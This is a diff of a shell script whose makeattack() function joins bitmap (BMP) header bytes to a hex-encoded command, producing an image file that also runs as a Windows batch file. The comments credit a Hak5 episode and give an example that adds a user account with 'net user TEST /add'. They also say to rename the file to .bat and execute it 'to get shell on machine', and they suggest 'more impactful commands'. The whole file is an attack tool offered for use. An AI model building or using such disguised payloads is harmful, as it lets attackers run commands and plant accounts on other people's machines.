@@ -1,25 +1,24 @@
+# Attack idea came from 
+# https://www.hak5.org/episodes/hak5-925
+# further exploring this - lead me to the discovery or adding additional commands to this since the attack does add 
+# cmd.exe to the file, one could simple just... make more impactful commands ...
+# the constructor is the baseline attack which enables the cmd prompt -
 #
-# Command to help dump string to Hex and produce hex bytes
-# makehex() {
-#  echo $1 | \
-#  hexdump -e '16/1 "%02x"' | \
-#  tr -d " \n" | \
-#  sed -r 's/(.{2})/\\x\1/g'; \
-#  echo
-#}
-
-constructor="\x42\x4d\x4a\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\
+# Commands to help dump string to Hex and produce hex bytes
+#
+makeattack() {
+ constructor="\x42\x4d\x4a\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\
 \x00\x00\x06\x00\x00\x00\x01\x00\x00\x00\x01\x00\x18\x00\x00\x00\
 \x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
 \x00\x00\x00\x00\x00\x00\x00\x00\x0a\x0d\x0a\x0d"
-makeattack() {
- tail=`echo $1 | \
+ trailer=`echo $1 | \
  hexdump -e '16/1 "%02x"' | \
  tr -d " \n" | \
  sed -r 's/(.{2})/\\\x\1/g'`;
- echo $constructor$tail;
+ echo $constructor$trailer;
 }
 # Example use:
+#  makeattack "/c net user TEST /add"
 # Change extension to bat
 # Execute to get shell on machine
 # hexdump version to ensure no actions are performed 
